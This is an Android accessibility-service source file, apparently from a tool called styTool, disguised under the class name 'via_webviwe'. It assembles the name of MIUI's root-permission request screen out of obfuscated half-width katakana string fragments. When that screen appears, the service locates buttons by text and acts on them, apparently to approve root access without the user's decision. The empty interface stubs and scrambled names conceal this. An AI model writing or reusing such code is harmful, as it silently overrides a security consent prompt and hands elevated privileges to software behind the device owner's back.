package nico.styTool;

import android.accessibilityservice.AccessibilityService;
import android.annotation.SuppressLint;
import android.content.pm.IPackageStatsObserver;
import android.content.pm.PackageStats;
import android.os.RemoteException;
import android.support.annotation.NonNull;
import android.support.design.widget.NavigationView;
import android.support.v7.widget.Toolbar;
import android.view.MenuItem;
import android.view.View;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class via_webviwe extends AccessibilityService
        implements Toolbar.OnMenuItemClickListener, NavigationView.OnNavigationItemSelectedListener, View.OnClickListener {

    @Override
    public boolean onNavigationItemSelected(@NonNull MenuItem p1) {
        return false;
    }

    @Override
    public void onClick(View p1) {
    }


    @Override
    public boolean onMenuItemClick(MenuItem item) {
        return false;
    }

    private String ｧ = XposedInit.ｧ;
    private String ｩ = XposedInit.ｩ;
    private String ｫ = XposedInit.ｫ;
    private String ｷ = ｧ + ｩ + ｫ;
    private String a = ".";
    private String ｦ = "com" + a;
    private String b = ".";
    private String ｨ = "miui" + b;
    private String c = ".";
    private String ｮ = "permcenter" + c;
    private String d = ".";
    private String ﾆ = "root" + d;
    private String e = "ppap";
    private String ﾓ = "RootApplyActivity";
    private String ｯ = ｦ + ｨ + ｮ + ﾆ + ﾓ;

    class MyPackageStateObserver extends IPackageStatsObserver.Stub {

        @Override
        public void onGetStatsCompleted(PackageStats pStats, boolean succeeded) throws RemoteException {
            long cacheSize = pStats.cacheSize;
//            sb.delete(0, sb.length());
            if (cacheSize > 0) {

            }

        }
    }

    @SuppressLint({"NewApi"})
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        switch (accessibilityEvent.getEventType()) {
            case 32:
                String charSequence = accessibilityEvent.getClassName().toString();
                System.out.println(charSequence);
                if (charSequence.equals(ｯ)) {
                    AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
                    if (rootInActiveWindow != null) {
                        for (AccessibilityNodeInfo accessibilityNodeInfo : rootInActiveWindow.findAccessibilityNodeInfosByText(ｷ)) {
                            accessibilityNodeInfo.performAction(1);
                        }
                    }

                    return;
                }
                return;
            default:
        }
    }

    public void onInterrupt() {
    }
}
